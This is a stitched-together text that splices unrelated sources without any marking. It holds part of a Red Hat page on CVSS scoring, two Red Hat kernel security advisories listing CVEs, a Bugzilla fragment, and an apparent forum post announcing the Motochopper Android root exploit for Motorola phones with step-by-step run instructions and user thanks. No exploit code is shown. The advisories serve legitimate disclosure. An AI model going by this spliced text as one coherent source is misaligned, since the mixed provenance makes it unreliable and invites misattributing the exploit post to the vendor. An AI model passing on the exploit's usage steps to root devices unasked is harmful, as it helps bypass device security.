score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2015%3A0695)

## Topic

Updated kernel packages that fix multiple security issues and two bugs are
now available for Red Hat Enterprise Linux 6.2 Advanced Update Support.

Red Hat Product Security has rated this update as having Important security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

The kernel packages contain the Linux kernel, the core of any Linux
operating system.

* A flaw was found in the way the Linux kernel's SCTP implementation

validated INIT chunks when performing Address Configuration Change
(ASCONF). A remote attacker could use this flaw to crash the system by
sending a specially crafted SCTP packet to trigger a NULL pointer
dereference on the system. (CVE-2014-7841, Important)

* It was found that the Linux kernel's Infiniband subsystem did not

properly sanitize input parameters while registering memory regions from
user space via the (u)verbs API. A local user with access to a
/dev/infiniband/uverbsX device could use this flaw to crash the system or,
potentially, escalate their privileges on the system. (CVE-2014-8159,
Important)

* An integer overflow flaw was found in the way the Linux kernel's Frame

Buffer device implementation mapped kernel memory to user space via the
mmap syscall. A local user able to access a frame buffer device file
(/dev/fb\*) could possibly use this flaw to escalate their privileges on the
system. (CVE-2013-2596, Important)

* It was found that the parse\_rock\_ridge\_inode\_internal() function of the

Linux kernel's ISOFS implementation did not correctly check relocated
directories when processing Rock Ridge child link (CL) tags. An attacker
with physical access to the system could use a specially crafted ISO image
to crash the system or, potentially, escalate their privileges on the
system. (CVE-2014-5471, CVE-2014-5472, Low)

Red Hat would like to thank Mellanox for reporting the CVE-2014-8159 issue.
The CVE-2014-7841 issue was discovered by Liu Wei of Red Hat.

This update also fixes the following bugs:

* Previously, certain network device drivers did not accept ethtool

commands right after they were loaded. As a consequence, the current
setting of the specified device driver was not applied and an error message
was returned. The ETHTOOL\_DELAY variable has been added, which makes sure
the ethtool utility waits for some time before it tries to apply the
options settings, thus fixing the bug. (BZ#1138299)

* During the memory allocation for a new socket to communicate to the

server, the rpciod daemon released a clean page which needed to be
committed. However, the commit was queueing indefinitely as the commit
could only be provided with a socket connection. As a consequence, a
deadlock occurred in rpciod. This update sets the PF\_FSTRANS flag on the
work queue task prior to the socket allocation, and adds the
nfs\_release\_page check for the flag when deciding whether to make a commit
call, thus fixing this bug. (BZ#1192326)

All kernel users are advised to upgrade to these updated packages, which
contain backported patches to correct these issues. The system must be
rebooted for this update to take effect.

## Solution

Before applying this update, make sure all previously released errata relevant
to your system have been applied.

| [Description](show_bug.cgi?id=1034490#c0)  Vincent Danen    2013-11-25 23:31:20 UTC  ``` Linux kernel built with the Frame Buffer devices support(CONFIG_FB) is vulnerable to an integer overflow flaw. It could occur while mapping memory via mmap2(2) call. User would need to have privileges to access the video device files /dev/fb* etc.  A user/program able to access the video device files could use this flaw to potentially escalate privileges on a system.

## Topic

Updated kernel packages that fix multiple security issues and several bugs
are now available for Red Hat Enterprise Linux 6.5 Extended Update Support.

Red Hat Product Security has rated this update as having Important security
impact. Common Vulnerability Scoring System (CVSS) base scores, which give
detailed severity ratings, are available for each vulnerability from the
CVE links in the References section.

## Description

The kernel packages contain the Linux kernel, the core of any Linux
operating system.

* It was found that the Linux kernel's Infiniband subsystem did not

properly sanitize input parameters while registering memory regions from
user space via the (u)verbs API. A local user with access to a
/dev/infiniband/uverbsX device could use this flaw to crash the system or,
potentially, escalate their privileges on the system. (CVE-2014-8159,
Important)

* A use-after-free flaw was found in the way the Linux kernel's SCTP

implementation handled authentication key reference counting during INIT
collisions. A remote attacker could use this flaw to crash the system or,
potentially, escalate their privileges on the system. (CVE-2015-1421,
Important)

* An integer overflow flaw was found in the way the Linux kernel's Frame

Buffer device implementation mapped kernel memory to user space via the
mmap syscall. A local user able to access a frame buffer device file
(/dev/fb\*) could possibly use this flaw to escalate their privileges on the
system. (CVE-2013-2596, Important)

* It was found that the Linux kernel's KVM implementation did not ensure

that the host CR4 control register value remained unchanged across VM
entries on the same virtual CPU. A local, unprivileged user could use this
flaw to cause a denial of service on the system. (CVE-2014-3690, Moderate)

* It was found that the parse\_rock\_ridge\_inode\_internal() function of the

Linux kernel's ISOFS implementation did not correctly check relocated
directories when processing Rock Ridge child link (CL) tags. An attacker
with physical access to the system could use a specially crafted ISO image
to crash the system or, potentially, escalate their privileges on the
system. (CVE-2014-5471, CVE-2014-5472, Low)

* A stack-based buffer overflow flaw was found in the TechnoTrend/Hauppauge

DEC USB device driver. A local user with write access to the corresponding
device could use this flaw to crash the kernel or, potentially, elevate
their privileges on the system. (CVE-2014-8884, Low)

Red Hat would like to thank Mellanox for reporting CVE-2014-8159, and Andy
Lutomirski for reporting CVE-2014-3690. The CVE-2015-1421 issue was
discovered by Sun Baoliang of Red Hat.

This update also fixes the following bugs:

* Previously, a NULL pointer check that is needed to prevent an oops in the

nfs\_async\_inode\_return\_delegation() function was removed. As a consequence,
a NFS4 client could terminate unexpectedly. The missing NULL pointer check
has been added back, and NFS4 client no longer crashes in this situation.
(BZ#1187638)

* Due to unbalanced multicast join and leave processing, the attempt to

leave a multicast group that had not previously completed a join became
unresponsive. This update resolves multiple locking issues in the IPoIB
multicast code that allowed multicast groups to be left before the joining
was entirely completed. Now, multicast join and leave failures or lockups
no longer occur in the described situation. (BZ#1187663)

* A failure to leave a multicast group which had previously been joined

prevented the attempt to unregister from the "sa" service. Multiple locking
issues in the IPoIB multicast join and leave processing have been fixed so
that leaving a group that has completed its join process is successful.
As a result, attempts to unregister from the "sa" service no longer lock up
due to leaked resources. (BZ#1187665)

* Due to a regression, when large reads which partially extended beyond the

end of the underlying device were done, the raw driver returned the EIO
error code instead of returning a short read covering the valid part of the
device. The underlying source code has been patched, and the raw driver now
returns a short read for the remainder of the device. (BZ#1195746)

All kernel users are advised to upgrade to these updated packages, which
contain backported patches to correct these issues. The system must be
rebooted for this update to take effect.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

After publishing yesterday's Motorola bootloader unlock tool, I feel bad that some people are running the unrooted 4.1.2 build for Razr HD. Let's fix that.

This exploit will root the Razr HD, Razr Maxx HD, Atrix HD, Photon Q, and Razr M, regardless of what build **(LONG SINCE NOT TRUE)** they're running. While these are the only supported Motorola devices, it will also root lots of other non-Motorola devices...feel free to try it and see. ;-)

But first, I thought I'd reflect a bit on the state of the rooting/modding community and my involvement in it. I published my first Android root exploit almost two years ago for the Droid 3 (it also re-rooted a number of other earlier devices). Since then, I've rooted every major Motorola device that's been released, including the Bionic, Razr (multiple times), Droid 4, Xoom 2, Atrix HD (multiple times), Razr HD, and Razr M. With the release of this exploit, every major Motorola device in existence has a viable public root method, and the most recent models now have an unlocked bootloader.

I see this as the end of an era for Motorola rooting and modding. At this point, it is significantly more difficult to find vulnerabilities that may be used to root Motorola devices than when I started two years ago, due to fixes for the all the bugs used in previous exploits. It has gotten to the point where there may not be a "next time" for publishing a Motorola root exploit. Of course vulnerabilities still exist, but as the pool of bugs shrinks, the number of people capable of finding them grows smaller and the time investment required increases. As a result, I have no plans to continue publishing Motorola root exploits after this release.

I have hopes that the acquisition of Motorola by Google will gradually lead to changes in policy allowing more open devices. If it doesn't, I encourage everyone to speak with your wallets when purchasing your devices: if an unlocked device is important to you, buy an unlocked device instead of expecting someone to accomplish a difficult hack.

The Motochopper exploit is attached to this thread. It may be used as follows:

* Extract the entire contents of the zip file.
* If you are using Windows, ensure you have installed the latest Motorola USB drivers available for your phone.
* Ensure USB Debugging mode is enabled on your device.
* If you are using Windows, navigate to the extracted directory and execute "run.bat". If you are using Linux or OS X, navigate to the extracted directory in a terminal and execute "./run.sh".

As always, future OTA updates may remove the ability to regain root access, so proceed with caution when updating. Enjoy!

**PLEASE NOTE (Only for July OTAs without Unlocks):**

**IF you have received and installed the recent July OTA updates for either the RAZR HD, HD Maxx or RAZR M and HAVE NOT unlocked your bootloader - Proceed to the following appropriate thread in order to obtain root to have your hopes completely smashed.**

Words can't express what you have done for this community Dan...I, personally, have benefited from a lot of your work and THANK YOU IMMENSELY! You are and always will be the ROOT GOD and I commend you for it! I hope that your exploits will have an influence on Google/Moto in the sense that their customers want desperately to have unlocked boot loaders. Thank you so much for all your hard work, time and genius!

Dan, as always you are the the savior of these locked down Moto devices. So once again, Thanks a million my friend! Hopefully we will see more freedom with our devices in future relaeses, but i guess only time will tell.

Thank you for all your hard work. I'm fairly new to the rooting game, but fully appreciate all the hoops you must jump through in order for the community to root their devices.

Thanks again!

I don't know if it's because I had SuperSU installed already (that's the only thing I changed between attempt #1 and #2), but it failed the first time, worked the second. Just FYI if anybody gets an initial failure.
